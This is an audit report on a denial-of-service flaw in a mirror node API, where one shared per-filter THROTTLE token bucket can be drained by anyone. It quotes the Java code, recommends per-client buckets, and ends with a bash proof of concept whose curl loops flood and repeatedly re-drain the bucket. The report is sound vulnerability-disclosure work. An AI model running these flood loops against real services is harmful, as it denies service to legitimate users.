# Audit Report

## Title
Shared Per-Filter THROTTLE Bucket Exhaustion Enables Targeted DoS Against Matching Requests

## Summary
The `THROTTLE` action in `RequestProperties` allocates a single shared `Bucket4j` bucket (max 100 tokens, refills at `rate` tokens/second) that is consumed by every request matching the filter. An unprivileged attacker can drain this bucket with a burst of ≤100 matching requests — consuming only 100 of the 500 available global tokens — causing all subsequent matching requests from other users to receive a `ThrottleException` for up to one full second. The attack is repeatable every ~1 second indefinitely.

## Finding Description
**Root cause — `createBucket()` in `RequestProperties.java` lines 63–69:**

```java
private Bucket createBucket() {
    final var bandwidth = Bandwidth.builder()
            .capacity(rate)                            // hard max: 100 tokens
            .refillGreedy(rate, Duration.ofSeconds(1)) // refills rate tokens/sec
            .build();
    return Bucket.builder().addLimit(bandwidth).build();
}
```

`rate` is bounded to `[0, 100]` by `@Min(0) @Max(100)` on line 39. The resulting bucket has a hard ceiling of **100 tokens**. This single instance is shared across all callers — there is no per-IP or per-user isolation. [8](#0-7) 

**Sampling bypass — `test()` line 50:**

```java
if (action != ActionType.THROTTLE && RandomUtils.secure().randomLong(0L, 100L) >= rate) {
    return false;
}
```

For `THROTTLE`, the random-sampling guard is unconditionally skipped, so **100% of matching requests** proceed to `tryConsume`. [4](#0-3) 

**Consumption path — `action()` in `ThrottleManagerImpl.java` lines 70–74:**

```java
case THROTTLE -> {
    if (!filter.getBucket().tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
}
``` [5](#0-4) 

**Why the global rate limit does not protect:**

The global `rateLimitBucket` (500 req/s default) is checked first at line 38, but it is a separate, independent bucket. An attacker sending 100 matching requests consumes only 100 of 500 global tokens, fully draining the per-filter bucket while leaving 400 global tokens untouched. [6](#0-5) [7](#0-6) 

## Impact Explanation
Once the 100-token filter bucket is exhausted, every user whose request matches the filter receives `ThrottleException("Requests per second rate limit exceeded")` for up to one full second. If the filter targets a broad pattern (e.g., a specific contract address or call-data prefix), this is a targeted denial-of-service against all users of that contract. The attacker's non-matching traffic is completely unaffected. Severity is **Medium**: availability impact is real and repeatable, but bounded to the subset of requests matching the filter and to 1-second windows.

## Likelihood Explanation
No authentication or special privilege is required. The attacker only needs to know (or infer) what request pattern the filter matches. Sending 100 HTTP requests in a burst is trivial with any HTTP client. The attack is fully repeatable every ~1 second and can be automated with a simple loop.

## Recommendation
Replace the single shared bucket with a **per-source-IP (or per-authenticated-user) bucket map** inside `RequestProperties`. Use a `ConcurrentHashMap<String, Bucket>` keyed on the client identifier, creating a new bucket per key on first access (with a cache eviction policy to bound memory). This ensures one user's burst cannot exhaust the quota of other users. Alternatively, apply a per-IP pre-filter at the reverse-proxy/load-balancer layer before requests reach the application-level `THROTTLE` logic.

## Proof of Concept
Assuming a `THROTTLE` filter is configured to match requests to contract address `0xABCD...` with `rate=100`:

```bash
# Step 1: Drain the shared bucket (100 matching requests in one burst)
for i in $(seq 1 100); do
  curl -s -X POST http://mirror-node/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0xABCD...","data":"0x..."}' &
done
wait

# Step 2: Legitimate user's request now receives ThrottleException
curl -X POST http://mirror-node/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0xABCD...","data":"0x..."}'
# Response: 429 "Requests per second rate limit exceeded"

# Step 3: Repeat every ~1 second to sustain the DoS
while true; do
  for i in $(seq 1 100); do
    curl -s ... &
  done
  wait
  sleep 0.9
done
```

The attacker's 100 requests each succeed (bucket had 100 tokens). All subsequent matching requests from other users are rejected until the bucket refills after ~1 second.
